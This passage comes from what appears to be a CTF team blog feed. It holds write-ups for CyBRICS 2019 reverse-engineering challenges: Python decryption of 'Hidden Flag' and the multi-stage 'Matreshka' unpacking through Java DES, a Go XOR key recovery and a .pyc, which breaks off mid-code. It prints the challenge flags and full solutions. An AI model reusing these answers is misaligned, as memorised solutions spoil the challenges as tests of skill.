class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_table</span><span class="params">(key)</span>:</span></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">table.append(i)</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">iVar1 = ord(key[j%len(key)]) + table[j] + v6</span><br><span class="line">v6 = ((iVar1&amp;<span class="number">0xff</span>) + iVar1) - iVar1</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[j]</span><br><span class="line">table[j] = table[v6]</span><br><span class="line">table[v6] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"><span class="keyword">return</span> table</span><br></pre></td></tr></table></figure></p><p>The same thing can be done for the <strong>decryptFlag</strong> function in this case I chose to use <strong>GHIDRA</strong> which the pseudo code was a bit more understandable for me at least:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4iMbw3P.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4iMbw3P.png" alt><br></a></p><p>Once again this could easily be converted to python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span><span class="params">(table,flagB)</span>:</span></span><br><span class="line">l = len(flagB)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(l):</span><br><span class="line">flag.append(<span class="string">'x'</span>)</span><br><span class="line"></span><br><span class="line">local_38 = <span class="number">0</span>;</span><br><span class="line">local_34 = <span class="number">0</span>;</span><br><span class="line">local_28 = <span class="number">0</span>;</span><br><span class="line">local_20 = l;</span><br><span class="line"><span class="keyword">while</span> (local_28 &lt; local_20):</span><br><span class="line">local_38 = local_38 + <span class="number">1</span> &amp; <span class="number">0xff</span></span><br><span class="line">local_34 = local_34 + table[local_38] &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[local_38]</span><br><span class="line">table[local_38] = table[local_34]</span><br><span class="line">table[local_34] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"></span><br><span class="line">flag[local_28] = table[table[local_38]+table[local_34] &amp; <span class="number">0xff</span>] ^ ord(flagB[local_28])</span><br><span class="line"></span><br><span class="line">local_28 = local_28 + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag])</span><br></pre></td></tr></table></figure><p>Obviously there was no need to rewrite all of this in python if you manage to run the binary on your computer in my case I wasn’t able to do it in my virtual machine due to some errors that I don’t know, if you could run it you just needed to put a break point in the end and watch the stored values obtaining the flag with ease. The final python script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">flagB = <span class="string">'\x2D\xFB\x9B\xA8\x21\xF8\xB0\xB5\xFA\xEC\x58\xC5\xF9\x35\x57\xFA\xE1\x62\x0E\x19\x45\x7D\x33\x58\x6F\xC9\x88\x4F\x70\x82'</span></span><br><span class="line">key = <span class="string">'qweasdzxc'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_table</span><span class="params">(key)</span>:</span></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">table.append(i)</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">iVar1 = ord(key[j%len(key)]) + table[j] + v6</span><br><span class="line">v6 = ((iVar1&amp;<span class="number">0xff</span>) + iVar1) - iVar1</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[j]</span><br><span class="line">table[j] = table[v6]</span><br><span class="line">table[v6] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"><span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span><span class="params">(table,flagB)</span>:</span></span><br><span class="line">l = len(flagB)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(l):</span><br><span class="line">flag.append(<span class="string">'x'</span>)</span><br><span class="line"></span><br><span class="line">local_38 = <span class="number">0</span>;</span><br><span class="line">local_34 = <span class="number">0</span>;</span><br><span class="line">local_28 = <span class="number">0</span>;</span><br><span class="line">local_20 = l;</span><br><span class="line"><span class="keyword">while</span> (local_28 &lt; local_20):</span><br><span class="line">local_38 = local_38 + <span class="number">1</span> &amp; <span class="number">0xff</span></span><br><span class="line">local_34 = local_34 + table[local_38] &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[local_38]</span><br><span class="line">table[local_38] = table[local_34]</span><br><span class="line">table[local_34] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"></span><br><span class="line">flag[local_28] = table[table[local_38]+table[local_34] &amp; <span class="number">0xff</span>] ^ ord(flagB[local_28])</span><br><span class="line"></span><br><span class="line">local_28 = local_28 + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt_flag(generate_table(key), flagB)</span><br></pre></td></tr></table></figure><p>Getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python hiddenFlag/hidden.py </span><br><span class="line">cybrics&#123;H1DD3N_D33P_1N_NTKRNL&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>cybrics{H1DD3N_D33P_1N_NTKRNL}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hidden Flag 220&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Hidden Flag (Reverse, Hard, 220 pts) Auth
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="volatility" scheme="https://teamrocketist.github.io/tags/volatility/"/>
    
      <category term="memory" scheme="https://teamrocketist.github.io/tags/memory/"/>
    
      <category term="ghidra" scheme="https://teamrocketist.github.io/tags/ghidra/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] CyBRICS CTF Quals 2019 - Matreshka</title>
    <link href="https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/"/>
    <id>https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/</id>
    <published>2019-07-22T09:29:14.000Z</published>
    <updated>2019-07-22T11:39:05.518Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Matreshka 50</p></blockquote><blockquote><p><strong>Description</strong>:<br>Matreshka (Reverse, Easy, 50 pts) Author: Khanov Artur (awengar)<br>Matreshka hides flag. Open it<br><a href="https://cybrics.net/files/matreshka.zip" target="_blank" rel="noopener">https://cybrics.net/files/matreshka.zip</a></p></blockquote><h3 id="Decompiling-java"><a href="#Decompiling-java" class="headerlink" title="Decompiling java"></a>Decompiling java</h3><p>After unzipping the file we find 2 files one is a <strong>.class</strong> and an encrypted file. First thing that I did was to decompile the <strong>.class</strong> file I used this website to do it <a href="http://www.decompiler.com" target="_blank" rel="noopener">http://www.decompiler.com</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Code2</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">      DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">      SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">      Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      var6.init(<span class="number">2</span>, var5);</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">      <span class="keyword">return</span> var7;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">      DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">      SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">      Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      var6.init(<span class="number">1</span>, var5);</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">      <span class="keyword">return</span> var7;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String var1 = <span class="string">"matreha!"</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] var2 = encode(System.getProperty(<span class="string">"user.name"</span>).getBytes(), var1);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">         <span class="keyword">if</span> (var3[var4] != var2[var4]) &#123;</span><br><span class="line">            System.out.println(<span class="string">"No"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      File var9 = <span class="keyword">new</span> File(<span class="string">"data.bin"</span>);</span><br><span class="line">      FileInputStream var5 = <span class="keyword">new</span> FileInputStream(var9);</span><br><span class="line">      <span class="keyword">byte</span>[] var6 = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>)var9.length()];</span><br><span class="line">      var5.read(var6);</span><br><span class="line">      var5.close();</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = decode(var6, System.getProperty(<span class="string">"user.name"</span>));</span><br><span class="line">      FileOutputStream var8 = <span class="keyword">new</span> FileOutputStream(<span class="string">"stage2.bin"</span>);</span><br><span class="line">      var8.write(var7, <span class="number">0</span>, var7.length);</span><br><span class="line">      var8.flush();</span><br><span class="line">      var8.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Interpreting-the-java-file"><a href="#Interpreting-the-java-file" class="headerlink" title="Interpreting the java file"></a>Interpreting the java file</h3><p>Now that we have some java code I started to analyse the <strong>decode</strong> and <strong>encode</strong> functions and we can easily see that the algorithm used for the encryption was <strong>DES</strong>, the encode function <strong>encrypts</strong> an array of bytes with a <strong>key</strong> string, the decode function obviously does the opposite. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">     <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">     DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">     SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">     Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">     var6.init(<span class="number">1</span>, var5);</span><br><span class="line">     <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">     <span class="keyword">return</span> var7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>By looking at the main function we can see the key used to encrypt the file was an <strong>username</strong> from the machine of the <strong>creator</strong> of the challenge, we don’t know this username but we do know the result of the encryption of this username and the key used:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String var1 = <span class="string">"matreha!"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] var2 = encode(System.getProperty(<span class="string">"user.name"</span>).getBytes(), var1);</span><br><span class="line"><span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">   <span class="keyword">if</span> (var3[var4] != var2[var4]) &#123;</span><br><span class="line">      System.out.println(<span class="string">"No"</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can easily reverse this since we have the <strong>key</strong> matreha! we can just use the <strong>decode</strong> function to decrypt the username and use it to decrypt the <strong>stage2.bin</strong>, I did small modifications to the java file and ended up with this:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Code2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] paramArrayOfByte, String paramString) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = paramString.getBytes();</span><br><span class="line">    DESKeySpec dESKeySpec = <span class="keyword">new</span> DESKeySpec(arrayOfByte);</span><br><span class="line">    SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(<span class="number">2</span>, secretKey);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(paramArrayOfByte);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] paramArrayOfByte, String paramString) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = paramString.getBytes();</span><br><span class="line">    DESKeySpec dESKeySpec = <span class="keyword">new</span> DESKeySpec(arrayOfByte);</span><br><span class="line">    SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(<span class="number">1</span>, secretKey);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(paramArrayOfByte);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"matreha!"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte2 = &#123; <span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span> &#125;;</span><br><span class="line">    <span class="keyword">byte</span>[] userName = decode(arrayOfByte2, str);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte1 = encode(userName, str);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b = <span class="number">0</span>; b &lt; arrayOfByte2.length; b++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arrayOfByte2[b] != arrayOfByte1[b]) &#123;</span><br><span class="line">        System.out.println(<span class="string">"No"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    File file = <span class="keyword">new</span> File(<span class="string">"data.bin"</span>);</span><br><span class="line">    FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte3 = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>)file.length()];</span><br><span class="line">    fileInputStream.read(arrayOfByte3);</span><br><span class="line">    fileInputStream.close();</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte4 = decode(arrayOfByte3, <span class="keyword">new</span> String(userName));</span><br><span class="line">    FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"stage2.bin"</span>);</span><br><span class="line">    fileOutputStream.write(arrayOfByte4, <span class="number">0</span>, arrayOfByte4.length);</span><br><span class="line">    fileOutputStream.flush();</span><br><span class="line">    fileOutputStream.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now compiling it with <strong>javac</strong> and running with <strong>java</strong> commands we get stage2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ javac wtf.java </span><br><span class="line">$ java Code2</span><br><span class="line">$ file stage2.bin </span><br><span class="line">stage2.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=FBY_TepBaPVEzlo3-SXy/Zsd256T1rd3lPJ9tnxng/YgTlqVI_KVISIMJ6lZi7/tIlG0PXO43MvY1MOVlul, not stripped</span><br></pre></td></tr></table></figure><h3 id="Stage2-golang-binary"><a href="#Stage2-golang-binary" class="headerlink" title="Stage2 (golang binary)"></a>Stage2 (golang binary)</h3><p>Now we have a 64bit ELF, this a <strong>go</strong> binary , this one is very similar to the previous challenge but kind of harder to reverse since is go, this time instead of the system username the directory name is used to encrypt the file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Gd4nKtW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Gd4nKtW.png" alt><br></a></p><p>Once again after this, a verification of an encrypted folder is done before trying to decrypt the stage3 file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7rUE08z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7rUE08z.png" alt><br></a></p><p>After this I created a folder named <strong>abcdefghijklmnopq</strong> which has <strong>0x11</strong> (17 in decimal) of size, I inserted a break point at <strong>cmp     dl, bl</strong> and dumped the encrypted string <strong>abcdefghijklmnopq</strong> and the original encrypted string folder name which is present in the binary.</p><p>First getting the encrypted bytes of the folder I created:<br><a data-fancybox="gallery" href="https://i.imgur.com/UWSKQJg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UWSKQJg.png" alt><br></a><br>Second get the encrypted bytes of the original folder:<br><a data-fancybox="gallery" href="https://i.imgur.com/b460Sn5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/b460Sn5.png" alt><br></a></p><p>We have everything we need to recover the original folder name! Since is xor encryption we just need to get the bytes of the encrypted string <strong>abcdefghijklmnopq</strong> xor it with the plaintext <strong>abcdefghijklmnopq</strong> and finally <strong>xor</strong> with encrypted original name reversing the all thing, I used a python script to do this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x59</span>,<span class="number">0xCD</span>,<span class="number">0xC9</span>,<span class="number">0x90</span>,<span class="number">0xE9</span>,<span class="number">0x6E</span>,<span class="number">0x9F</span>,<span class="number">0x23</span>,<span class="number">0x4B</span>,<span class="number">0xAF</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0xCC</span>,<span class="number">0x39</span>,<span class="number">0x03</span>,<span class="number">0xDB</span>,<span class="number">0xA0</span>]</span><br><span class="line">cp =[<span class="number">0x53</span>,<span class="number">0xdd</span>,<span class="number">0xc5</span>,<span class="number">0x87</span>,<span class="number">0xe4</span>,<span class="number">0x63</span>,<span class="number">0x99</span>,<span class="number">0x14</span>,<span class="number">0x4f</span>,<span class="number">0xa4</span>,<span class="number">0x14</span>,<span class="number">0x2d</span>,<span class="number">0xc4</span>,<span class="number">0x24</span>,<span class="number">0x04</span>,<span class="number">0xc0</span>,<span class="number">0xb0</span>]</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(<span class="string">'abcdefghijklmnopq'</span>):</span><br><span class="line">key += chr(ord(c) ^ a[i] ^ cp[i])</span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><p>Getting the original folder name</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python qwd.py </span><br><span class="line">kroshka_matreshka</span><br></pre></td></tr></table></figure><p>To dump the final file just move the binary to a folder named <strong>kroshka_matreshka</strong></p><h3 id="Stage-3-python-pyc-file"><a href="#Stage-3-python-pyc-file" class="headerlink" title="Stage 3 (python pyc file)"></a>Stage 3 (python pyc file)</h3><p>This stage is the easiest one we just need to decompile the <strong>.pyc</strong> with <a href="https://pypi.org/project/uncompyle6/" target="_blank" rel="noopener">https://pypi.org/project/uncompyle6/</a> and we end up with this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 